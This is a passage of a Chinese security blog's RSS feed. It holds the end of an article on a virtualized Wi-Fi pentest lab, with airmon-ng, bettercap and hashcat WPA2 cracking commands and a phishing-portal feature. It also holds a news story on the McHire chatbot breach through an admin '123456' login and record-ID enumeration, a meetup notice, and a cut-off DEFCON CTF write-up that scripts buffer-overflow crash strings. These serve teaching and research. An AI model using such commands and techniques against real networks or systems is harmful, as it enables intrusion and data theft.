&lt;li&gt;实验室环境秒级重置功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;技术挑战与解决方案&#34;&gt;技术挑战与解决方案
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;挑战类型&lt;/th&gt;
          &lt;th&gt;具体问题&lt;/th&gt;
          &lt;th&gt;应对方案&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;内核兼容性&lt;/td&gt;
          &lt;td&gt;Ubuntu/Kali驱动差异&lt;/td&gt;
          &lt;td&gt;开发专用内核补丁&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;虚拟化稳定性&lt;/td&gt;
          &lt;td&gt;VMware USB穿透故障&lt;/td&gt;
          &lt;td&gt;改用QEMU-KVM架构&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;工具链集成&lt;/td&gt;
          &lt;td&gt;依赖项冲突&lt;/td&gt;
          &lt;td&gt;容器化部署（Docker镜像5GB）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;实战演示亮点&#34;&gt;实战演示亮点
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Bettercap流量分析&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虚拟AP信标(Beacon)注入&lt;/li&gt;
&lt;li&gt;实时信道跳频监控&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 监控模式启动&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo airmon-ng start wlan0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bettercap -iface wlan0mon
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;WPA2握手包捕获&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过虚拟化deauth攻击触发重连&lt;/li&gt;
&lt;li&gt;使用Hashcat破解PMKID哈希&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hashcat -m &lt;span class=&#34;m&#34;&gt;22000&lt;/span&gt; handshake.cap rockyou.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Wi-Fi钓鱼门户&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自适应浏览器User-Agent检测&lt;/li&gt;
&lt;li&gt;支持Windows/Android/iOS不同认证界面&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;未来路线图&#34;&gt;未来路线图
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;WPA3支持&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Dragon Blood攻击向量模拟&lt;/li&gt;
&lt;li&gt;SAE握手过程可视化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;企业级功能&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无线环境快照工具（YAML配置输出）&lt;/li&gt;
&lt;li&gt;真实客户网络拓扑克隆功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;云集成&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AWS/Azure云实验室部署&lt;/li&gt;
&lt;li&gt;分布式破解集群支持&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;项目已开源在Black Hills信息安全GitHub仓库，开发者可贡献模块扩展攻击矩阵。该技术显著降低了无线安全研究的法律风险与硬件成本，使车内/飞机等特殊场景的合规测试成为可能。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>麦当劳AI招聘机器人因使用密码&#34;123456&#34;致数百万求职者数据泄露</title>
        <link>http://localhost:1313/p/%E9%BA%A6%E5%BD%93%E5%8A%B3ai%E6%8B%9B%E8%81%98%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%A0%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81123456%E8%87%B4%E6%95%B0%E7%99%BE%E4%B8%87%E6%B1%82%E8%81%8C%E8%80%85%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</link>
        <pubDate>Mon, 04 Aug 2025 18:22:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%BA%A6%E5%BD%93%E5%8A%B3ai%E6%8B%9B%E8%81%98%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%A0%E4%BD%BF%E7%94%A8%E5%AF%86%E7%A0%81123456%E8%87%B4%E6%95%B0%E7%99%BE%E4%B8%87%E6%B1%82%E8%81%8C%E8%80%85%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</guid>
        <description>&lt;h1 id=&#34;麦当劳ai招聘机器人因使用密码123456致数百万求职者数据泄露&#34;&gt;麦当劳AI招聘机器人因使用密码&amp;quot;123456&amp;quot;致数百万求职者数据泄露
&lt;/h1&gt;&lt;p&gt;如今若想在麦当劳求职，你很可能会与&amp;quot;Olivia&amp;quot;对话。Olivia并非真人，而是由人工智能软件公司Paradox.ai开发的聊天机器人，负责筛选申请人、收集联系方式与简历、进行性格测试，有时会因反复误解基本问题而让求职者&amp;quot;抓狂&amp;quot;。&lt;/p&gt;
&lt;p&gt;直到上周，运行Olivia的平台仍存在荒谬的基础安全漏洞。实际上，任何黑客只需猜测管理员账户的用户名和密码是&amp;quot;123456&amp;quot;这样简单的操作，就能访问Olivia与麦当劳求职者的所有聊天记录——包括对话中分享的全部个人信息。&lt;/p&gt;
&lt;p&gt;7月9日，安全研究人员Ian Carroll和Sam Curry披露，他们发现了入侵McHire.com（麦当劳特许经营商使用的招聘网站）后端AI聊天机器人平台的简单方法。这两位长期从事独立安全测试的黑客发现，包括猜中一个可笑弱密码在内的简单Web漏洞，就能让他们访问Paradox.ai账户并查询存储所有用户与Olivia对话的数据库。这些数据包含约6400万条记录，涵盖申请人姓名、邮箱地址和电话号码。&lt;/p&gt;
&lt;p&gt;Carroll表示，他之所以发现申请人信息安全防护如此薄弱，是因为对麦当劳使用AI聊天机器人和性格测试筛选应聘者的做法产生了兴趣。&amp;ldquo;相比正常招聘流程，这简直像是反乌托邦场景。于是我决定深入调查，&amp;ldquo;Carroll说，&amp;ldquo;开始申请职位30分钟后，我们就获得了访问麦当劳多年来几乎所有申请记录的权限。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Paradox.ai在回应中确认了研究人员的发现，但声称只有部分记录包含个人信息，且除研究人员外没有第三方访问过使用&amp;quot;123456&amp;quot;密码的管理员账户。该公司表示已启动漏洞赏金计划，其首席法务官Stephanie King称：&amp;ldquo;虽然问题已迅速有效解决，但我们严肃对待此事。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;麦当劳则将责任归咎于第三方供应商：&amp;ldquo;我们对Paradox.ai存在这种不可接受的漏洞感到失望。获悉问题后，我们立即要求其修复，当天即得到解决。&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;Carroll在Reddit看到用户抱怨麦当劳招聘机器人用无意义回复浪费申请人时间后，开始关注McHire网站的安全性。他与Curry尝试寻找&amp;quot;提示注入&amp;quot;漏洞未果，转而测试网站后端访问权限时，意外发现Paradox.ai员工登录链接。&lt;/p&gt;
&lt;p&gt;Carroll尝试了两组最常见凭证：&amp;ldquo;admin&amp;quot;和&amp;quot;123456&amp;rdquo;，后者竟成功登录——该页面没有任何多因素认证。获得管理员权限后，他们能查看为虚构麦当劳&amp;quot;餐厅&amp;quot;提交的测试职位申请，并通过修改申请ID号（最高超过6400万）查看他人聊天记录和联系方式。&lt;/p&gt;
&lt;p&gt;虽然研究人员为避免侵犯隐私仅抽查了少量记录，但所有检查的ID都显示真实申请人信息。Paradox.ai称研究人员共访问7条记录，其中5条含McHire用户的个人信息。&lt;/p&gt;
&lt;h2 id=&#34;潜在风险&#34;&gt;潜在风险
&lt;/h2&gt;&lt;p&gt;尽管泄露的信息不算最敏感，但Carroll和Curry指出，这些数据关联着求职者在麦当劳的就业意向，极大提高了钓鱼攻击风险。&amp;ldquo;诈骗者完全可以冒充麦当劳招聘人员，索要直接存款所需的财务信息，&amp;ldquo;Curry表示，&amp;ldquo;若想实施工资诈骗，这是绝佳途径。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;研究人员还指出，暴露求职者申请（有时失败）最低工资工作的记录可能造成尴尬，但Carroll强调：&amp;ldquo;我对麦当劳员工唯有尊重——我自己就常去麦当劳。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;（2025年7月9日美国东部时间下午5点更新说明：钓鱼风险仅存在于有人实际利用数据的情况下）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>在Empire Hacking上探讨以太坊安全——Trail of Bits博客</title>
        <link>http://localhost:1313/p/%E5%9C%A8empire-hacking%E4%B8%8A%E6%8E%A2%E8%AE%A8%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8trail-of-bits%E5%8D%9A%E5%AE%A2/</link>
        <pubDate>Mon, 04 Aug 2025 18:05:16 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9C%A8empire-hacking%E4%B8%8A%E6%8E%A2%E8%AE%A8%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%AE%89%E5%85%A8trail-of-bits%E5%8D%9A%E5%AE%A2/</guid>
        <description>&lt;h1 id=&#34;在empire-hacking上探讨以太坊安全&#34;&gt;在Empire Hacking上探讨以太坊安全
&lt;/h1&gt;&lt;p&gt;如果你正在使用区块链技术构建实际应用并担心安全问题，这次聚会不容错过。加入我们12月12日的Empire Hacking特别活动，全程聚焦以太坊安全。&lt;/p&gt;
&lt;h2 id=&#34;为什么要参加&#34;&gt;为什么要参加？
&lt;/h2&gt;&lt;p&gt;四位区块链安全专家将分享如何编写安全的智能合约，以及如何攻击它们。其中两位演讲者来自我们的团队。&lt;/p&gt;
&lt;p&gt;我们已成为行业最受信任的审计、工具和最佳实践提供商之一，服务涵盖智能合约及其相关技术。我们保障过代币发行、去中心化应用乃至整个区块链平台的安全。与往届Empire Hacking活动一样，我们期待与开发社区分享前沿技术。&lt;/p&gt;
&lt;h2 id=&#34;演讲嘉宾&#34;&gt;演讲嘉宾
&lt;/h2&gt;&lt;p&gt;Trail of Bits的Sophia D&amp;rsquo;Antoine将讨论近期CTF比赛中Solidity和以太坊的挑战，以及利用这些漏洞所需的工具。&lt;/p&gt;
&lt;p&gt;Consensys Diligence的John Maurelian将分享Devcon3会议上关于以太坊安全最新进展的亮点。&lt;/p&gt;
&lt;p&gt;Mark Mossberg将展示Trail of Bits如何用符号执行引擎Manticore发现EVM字节码中的漏洞。&lt;/p&gt;
&lt;p&gt;Paul Makowski将介绍他即将推出的安全导向型以太坊代币PolySwarm，该代币利用区块链技术解决威胁情报行业的缺陷。&lt;/p&gt;
&lt;p&gt;企业以太坊联盟的Amber Baldet和Brian Schroeder将探讨Quorum区块链中应用的威胁建模、保密交易和零知识证明技术。&lt;/p&gt;
&lt;h2 id=&#34;时间地点&#34;&gt;时间地点
&lt;/h2&gt;&lt;p&gt;活动将于12月12日下午6点举行，地点在纽约时报大厦的DataDog办公室。需提前报名。照例提供简餐和啤酒。&lt;/p&gt;
&lt;p&gt;了解更多Empire Hacking信息：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;访问官网&lt;/li&gt;
&lt;li&gt;Meetup报名&lt;/li&gt;
&lt;li&gt;加入Slack社区&lt;/li&gt;
&lt;li&gt;关注Twitter @EmpireHacking&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>用Binary Ninja破解2000个二进制文件 - 逆向工程实战解析</title>
        <link>http://localhost:1313/p/%E7%94%A8binary-ninja%E7%A0%B4%E8%A7%A32000%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 17:48:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%94%A8binary-ninja%E7%A0%B4%E8%A7%A32000%E4%B8%AA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6-%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%AE%9E%E6%88%98%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;binary-ninja实战2000个二进制文件的自动化破解之旅&#34;&gt;Binary Ninja实战：2000个二进制文件的自动化破解之旅
&lt;/h3&gt;&lt;p&gt;在2016年DEFCON CTF资格赛中，我使用Vector35开发的Binary Ninja（一个极具潜力的交互式静态分析和逆向工程平台）编写脚本，为2000个独特二进制文件生成了&amp;quot;漏洞利用&amp;quot;。如果你想在后DARPA时代的DEFCON CTF中保持竞争力，我强烈推荐你了解Binary Ninja。&lt;/p&gt;
&lt;h4 id=&#34;工具对比binary-ninja-vs-ida&#34;&gt;工具对比：Binary Ninja vs IDA
&lt;/h4&gt;&lt;p&gt;与我使用IDA的经验（简直是用胶带和祈祷勉强维持）相比，Binary Ninja的工作流程令人愉悦。它基于自己的中间语言（IL）进行分析，并通过Python和C++ API暴露功能。查询代码块、函数、跟踪执行流、查询寄存器状态等操作都变得非常简单，而这些在IDA中简直是艰巨任务。&lt;/p&gt;
&lt;h4 id=&#34;挑战1334个二进制文件&#34;&gt;挑战1：334个二进制文件
&lt;/h4&gt;&lt;p&gt;第一个挑战是&amp;quot;334 cuts&amp;quot;，提供334个DECREE格式的挑战二进制文件，所有文件名都与食物相关。这些二进制文件被剥离了符号表，具有静态栈缓冲区、金丝雀值和基于栈的缓冲区溢出漏洞。金丝雀值被复制到栈上并与硬编码值进行比对。如果金丝雀值被覆盖，挑战将终止而不会崩溃。&lt;/p&gt;
&lt;p&gt;通过Binary Ninja的无界面分析引擎，我们编写Python脚本自动收集以下关键信息：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要溢出的缓冲区大小&lt;/li&gt;
&lt;li&gt;金丝雀字符串及其长度&lt;/li&gt;
&lt;li&gt;recvmsg函数中栈缓冲区大小&lt;/li&gt;
&lt;li&gt;writemsg函数每次写循环处理的数据量&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;binaryninja&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binaryninja&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BinaryViewType&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ELF&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;update_analysis&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;逆向工程关键步骤&#34;&gt;逆向工程关键步骤
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;定位main函数&lt;/strong&gt;：从入口点开始，通过跟踪调用链找到main函数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;识别关键调用&lt;/strong&gt;：收集所有call指令，确定memcpy、recvmsg和memcmp调用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;提取金丝雀值&lt;/strong&gt;：使用get_parameter_at()函数查询memcmp调用参数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算缓冲区大小&lt;/strong&gt;：通过栈帧偏移计算可溢出缓冲区大小&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 获取金丝雀参数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_frame&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_address&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary_width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get_parameter_at&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;memcmp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bv&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canary_address&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary_width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;构造崩溃字符串&#34;&gt;构造崩溃字符串
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 填充缓冲区&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buffer_size&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 添加金丝雀前4字节（总是4字节）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;canary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 填充剩余金丝雀缓冲区&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;crash_string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;canary_frame&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span 